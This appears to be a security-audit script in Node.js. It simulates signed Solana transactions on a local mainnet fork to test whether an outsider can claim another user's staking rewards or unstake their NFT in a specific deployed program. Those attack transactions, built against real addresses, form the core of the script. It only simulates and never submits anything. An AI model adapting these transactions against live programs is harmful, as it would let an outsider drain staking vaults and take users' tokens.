#!/usr/bin/env node
'use strict';

// Current-state local Surfpool fork only. Every v1 message is signed by a fresh,
// locally generated outsider and simulated with sigVerify:true. The script has no
// sendTransaction path and never writes a private key to disk/output.

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const {
  PublicKey,
  Keypair,
  TransactionInstruction,
  TransactionMessage,
  SystemProgram,
  SYSVAR_CLOCK_PUBKEY,
  SYSVAR_RENT_PUBKEY,
} = require('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@solana/web3.js');
const {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddressSync,
  createAssociatedTokenAccountIdempotentInstruction,
} = require('/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/@solana/spl-token');
const { encodeV1 } = require('../klend-v1-composition.js');

const P = (value) => new PublicKey(value);
const FORK = process.env.FOXY_FORK_RPC || 'http://127.0.0.1:9027';
const OUT = process.argv[2] || path.join(__dirname, 'signed-fork-outsider.json');
const PROGRAM = P('FoXpJL1exLBJgHVvdSHNKyKu2xX2uatctH9qp6dLmfpP');
const CONFIG = P('7N7M1H2CK51ip7sNtPgKhhv2eScx6BokLgHi1Ke3ZLiq');
const OTHER_CONFIG = P('6kW1byGh9RaeJGQNTDx8UWKuajD8u1tv83vrLzn7GSN7');
const AUTH = P('Gd18t9bFpigpnEWpYkXD6bhcbtKW5szN2HkgmFUtsM3m');
const VAULT = P('32Xe8tQYy7hZDH3PWFA8q34oPbHK1BXaDLnRDhuWCx8h');
const FOXY_MINT = P('FoXyMu5xwXre7zEoSvzViRk3nGawHUp9kUh97y2NDhcq');
const METADATA_PROGRAM = P('metaqbxxUerdq28cj1RbAWkYQm3ybzjb6a8bt518x1s');
const CLAIM_AUTHORITY = P('3pMvTLUA9NzZQd4gi725p89mvND1wRNQM3C8XEv1hTdA');
const VICTIM = {
  owner: P('BNF1uzrS9XUyjUYJ89X3QAhmJZLU7GyXXpMSp96pSx3X'),
  rewardAta: P('BH8BkxJgP5VZ4cHazTD2VvNxTTJFh7zdgq85g1EQUZPq'),
  stake: P('5ouUMrQuhr7n2241g4q9Ddq7FesgTGCgBgWZHeKUrxxM'),
  mint: P('3YqCz8eNJDhW3boSQdyCVmtpL9CzNmyPkyapF2qdBDwD'),
};

const claimDisc = crypto.createHash('sha256').update('global:claim').digest().subarray(0, 8);
const authUnstakeDisc = crypto.createHash('sha256').update('global:auth_unstake_fox').digest().subarray(0, 8);
const sha256 = (bytes) => crypto.createHash('sha256').update(bytes).digest('hex');
let requestId = 0;

async function rpc(method, params) {
  const response = await fetch(FORK, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: ++requestId, method, params }),
  });
  const body = await response.json();
  if (body.error) throw new Error(`${method}: ${JSON.stringify(body.error)}`);
  return body.result;
}

function claimIx({
  owner,
  destination,
  stake = VICTIM.stake,
  mint = VICTIM.mint,
  ownerSigner = true,
  config = CONFIG,
  authority = AUTH,
  vault = VAULT,
} = {}) {
  return new TransactionInstruction({
    programId: PROGRAM,
    keys: [
      { pubkey: config, isSigner: false, isWritable: true },
      { pubkey: authority, isSigner: false, isWritable: false },
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: stake, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: ownerSigner, isWritable: true },
      { pubkey: mint, isSigner: false, isWritable: false },
      { pubkey: FOXY_MINT, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: ASSOCIATED_TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: claimDisc,
  });
}

function authUnstakeIx(outsider, outsiderRewardAta, outsiderNftAta, {
  claimAuthority = outsider,
  claimAuthoritySigner = true,
} = {}) {
  const [mainAccount] = PublicKey.findProgramAddressSync(
    [CONFIG.toBuffer(), Buffer.from('auth'), VICTIM.owner.toBuffer()], PROGRAM,
  );
  const fromNftAta = getAssociatedTokenAddressSync(VICTIM.mint, VICTIM.owner);
  const [masterEdition] = PublicKey.findProgramAddressSync([
    Buffer.from('metadata'), METADATA_PROGRAM.toBuffer(), VICTIM.mint.toBuffer(), Buffer.from('edition'),
  ], METADATA_PROGRAM);
  return new TransactionInstruction({
    programId: PROGRAM,
    keys: [
      { pubkey: CONFIG, isSigner: false, isWritable: true },
      { pubkey: mainAccount, isSigner: false, isWritable: true },
      { pubkey: AUTH, isSigner: false, isWritable: false },
      { pubkey: VICTIM.stake, isSigner: false, isWritable: true },
      { pubkey: VICTIM.owner, isSigner: false, isWritable: false },
      { pubkey: outsider, isSigner: false, isWritable: true },
      { pubkey: fromNftAta, isSigner: false, isWritable: true },
      { pubkey: outsiderNftAta, isSigner: false, isWritable: true },
      { pubkey: VAULT, isSigner: false, isWritable: true },
      { pubkey: outsiderRewardAta, isSigner: false, isWritable: true },
      { pubkey: FOXY_MINT, isSigner: false, isWritable: false },
      { pubkey: VICTIM.mint, isSigner: false, isWritable: false },
      { pubkey: masterEdition, isSigner: false, isWritable: false },
      { pubkey: METADATA_PROGRAM, isSigner: false, isWritable: false },
      { pubkey: claimAuthority, isSigner: claimAuthoritySigner, isWritable: true },
      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: ASSOCIATED_TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_RENT_PUBKEY, isSigner: false, isWritable: false },
      { pubkey: SYSVAR_CLOCK_PUBKEY, isSigner: false, isWritable: false },
    ],
    data: authUnstakeDisc,
  });
}

function signV1(encoded, instructions, payer, keypairs, blockhash) {
  const compiled = new TransactionMessage({ payerKey: payer, recentBlockhash: blockhash, instructions })
    .compileToV0Message();
  const count = encoded.requiredSignatures;
  const signed = Buffer.from(encoded.wire);
  const message = signed.subarray(0, signed.length - 64 * count);
  const order = compiled.staticAccountKeys.slice(0, count).map(String);
  const byAddress = new Map(keypairs.map((keypair) => [keypair.publicKey.toBase58(), keypair]));
  for (let index = 0; index < count; index += 1) {
    const keypair = byAddress.get(order[index]);
    if (!keypair) throw new Error(`uncontrolled required signer ${order[index]}`);
    const privateKey = crypto.createPrivateKey({
      key: Buffer.concat([
        Buffer.from('302e020100300506032b657004220420', 'hex'),
        Buffer.from(keypair.secretKey.subarray(0, 32)),
      ]),
      format: 'der',
      type: 'pkcs8',
    });
    crypto.sign(null, message, privateKey).copy(signed, signed.length - 64 * count + index * 64);
  }
  return { signed, signerOrder: order };
}

function accountImage(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  const image = {
    owner: account.owner,
    lamports: account.lamports,
    dataLength: data.length,
    dataSha256: sha256(data),
  };
  if (account.owner === TOKEN_PROGRAM_ID.toBase58() && data.length >= 72) {
    image.mint = new PublicKey(data.subarray(0, 32)).toBase58();
    image.tokenAuthority = new PublicKey(data.subarray(32, 64)).toBase58();
    image.rawAmount = data.readBigUInt64LE(64).toString();
  }
  return image;
}

async function imageMany(addresses) {
  const response = await rpc('getMultipleAccounts', [addresses.map(String), {
    encoding: 'base64', commitment: 'processed',
  }]);
  return {
    slot: response.context.slot,
    accounts: Object.fromEntries(addresses.map((address, index) => [
      address.toBase58(), accountImage(response.value[index]),
    ])),
  };
}

async function simulate(label, instructions, outsider, blockhash, watched) {
  const encoded = encodeV1(instructions, outsider.publicKey, blockhash, 1_400_000, 67_108_864);
  if (encoded.sizeBytes > 4096 || encoded.addressCount > 64) throw new Error(`${label}: v1 limit exceeded`);
  const { signed, signerOrder } = signV1(encoded, instructions, outsider.publicKey, [outsider], blockhash);
  const before = await imageMany(watched);
  const result = await rpc('simulateTransaction', [signed.toString('base64'), {
    encoding: 'base64',
    sigVerify: true,
    replaceRecentBlockhash: false,
    commitment: 'processed',
    innerInstructions: true,
    accounts: { encoding: 'base64', addresses: watched.map(String) },
  }]);
  const afterSimulation = result.value.accounts
    ? Object.fromEntries(watched.map((address, index) => [address.toBase58(), accountImage(result.value.accounts[index])]))
    : null;
  const forkAfter = await imageMany(watched);
  return {
    label,
    preSlot: before.slot,
    simulationSlot: result.context.slot,
    postReadSlot: forkAfter.slot,
    err: result.value.err || null,
    unitsConsumed: result.value.unitsConsumed,
    logs: result.value.logs || [],
    innerInstructions: result.value.innerInstructions || [],
    message: {
      format: 'solana-v1',
      sigVerify: true,
      replaceRecentBlockhash: false,
      sizeBytes: encoded.sizeBytes,
      addressCount: encoded.addressCount,
      instructionCount: encoded.instructionCount,
      requiredSignatures: encoded.requiredSignatures,
      signerOrder,
      sha256: sha256(signed),
      signedBase64: signed.toString('base64'),
    },
    forkBefore: before.accounts,
    simulatedPost: afterSimulation,
    forkAfter: forkAfter.accounts,
    forkStateUnchanged: JSON.stringify(before.accounts) === JSON.stringify(forkAfter.accounts),
  };
}

async function main() {
  const outsider = Keypair.generate();
  await rpc('surfnet_setAccount', [outsider.publicKey.toBase58(), {
    data: '', executable: false, lamports: 10_000_000_000,
    owner: SystemProgram.programId.toBase58(), rentEpoch: 0,
  }]);
  const outsiderRewardAta = getAssociatedTokenAddressSync(FOXY_MINT, outsider.publicKey);
  const outsiderNftAta = getAssociatedTokenAddressSync(VICTIM.mint, outsider.publicKey);
  const [otherAuth] = PublicKey.findProgramAddressSync(
    [OTHER_CONFIG.toBuffer(), Buffer.from('auth')], PROGRAM,
  );
  const createRewardAta = createAssociatedTokenAccountIdempotentInstruction(
    outsider.publicKey, outsiderRewardAta, outsider.publicKey, FOXY_MINT,
  );
  const outsiderClaim = claimIx({
    owner: outsider.publicKey,
    destination: outsiderRewardAta,
  });
  const specs = [
    {
      label: 'claim_victim_position_as_fresh_outsider',
      instructions: [createRewardAta, outsiderClaim],
    },
    {
      label: 'claim_victim_owner_without_victim_signature',
      instructions: [claimIx({
        owner: VICTIM.owner,
        ownerSigner: false,
        destination: VICTIM.rewardAta,
      })],
    },
    {
      label: 'claim_substitute_authority_with_fresh_outsider',
      instructions: [createRewardAta, claimIx({
        owner: outsider.publicKey,
        destination: outsiderRewardAta,
        authority: outsider.publicKey,
      })],
    },
    {
      label: 'claim_cross_config_selected_vault',
      instructions: [createRewardAta, claimIx({
        owner: outsider.publicKey,
        destination: outsiderRewardAta,
        config: OTHER_CONFIG,
        authority: otherAuth,
      })],
    },
    {
      label: 'claim_victim_position_twice_as_fresh_outsider',
      instructions: [createRewardAta, outsiderClaim, outsiderClaim],
    },
    {
      label: 'auth_unstake_fresh_outsider_as_claim_authority',
      instructions: [createRewardAta, authUnstakeIx(
        outsider.publicKey, outsiderRewardAta, outsiderNftAta,
      )],
    },
    {
      label: 'auth_unstake_configured_authority_not_signer',
      instructions: [createRewardAta, authUnstakeIx(
        outsider.publicKey, outsiderRewardAta, outsiderNftAta,
        { claimAuthority: CLAIM_AUTHORITY, claimAuthoritySigner: false },
      )],
    },
    {
      label: 'auth_unstake_then_claim_atomic_fresh_outsider',
      instructions: [
        createRewardAta,
        authUnstakeIx(outsider.publicKey, outsiderRewardAta, outsiderNftAta),
        outsiderClaim,
      ],
    },
  ];
  const importAddresses = [...new Map(specs.flatMap((spec) => spec.instructions.flatMap((ix) => [
    ix.programId, ...ix.keys.map((key) => key.pubkey),
  ])).map((key) => [key.toBase58(), key])).values()];
  for (const address of importAddresses) {
    await rpc('getAccountInfo', [address.toBase58(), { encoding: 'base64', commitment: 'processed' }]);
  }
  const watched = [VAULT, outsiderRewardAta, VICTIM.rewardAta, VICTIM.stake,
    outsiderNftAta, getAssociatedTokenAddressSync(VICTIM.mint, VICTIM.owner), outsider.publicKey];
  const blockhash = (await rpc('getLatestBlockhash', [{ commitment: 'processed' }])).value.blockhash;
  const results = [];
  for (const spec of specs) {
    results.push(await simulate(spec.label, spec.instructions, outsider, blockhash, watched));
  }
  const output = {
    generatedAt: new Date().toISOString(),
    environment: 'isolated Surfpool current-mainnet fork; simulations only',
    forkRpc: FORK,
    noMainnetSubmission: true,
    noForkSubmission: true,
    privateKeyPersisted: false,
    outsider: outsider.publicKey.toBase58(),
    target: {
      programId: PROGRAM.toBase58(),
      vault: VAULT.toBase58(),
      vaultAuthority: AUTH.toBase58(),
      selectedConfig: CONFIG.toBase58(),
      otherConfig: OTHER_CONFIG.toBase58(),
    },
    limits: { maxWireBytes: 4096, maxInlineAccounts: 64 },
    results,
  };
  fs.writeFileSync(OUT, `${JSON.stringify(output, null, 2)}\n`);
  process.stdout.write(`${JSON.stringify({
    output: OUT,
    outsider: output.outsider,
    results: results.map((result) => ({
      label: result.label,
      err: result.err,
      unitsConsumed: result.unitsConsumed,
      wireBytes: result.message.sizeBytes,
      addressCount: result.message.addressCount,
      instructionCount: result.message.instructionCount,
      requiredSignatures: result.message.requiredSignatures,
      signerOrder: result.message.signerOrder,
      forkStateUnchanged: result.forkStateUnchanged,
      lastLogs: result.logs.slice(-8),
    })),
  }, null, 2)}\n`);
}

main().catch((error) => {
  process.stderr.write(`${error.stack || error.message}\n`);
  process.exitCode = 1;
});
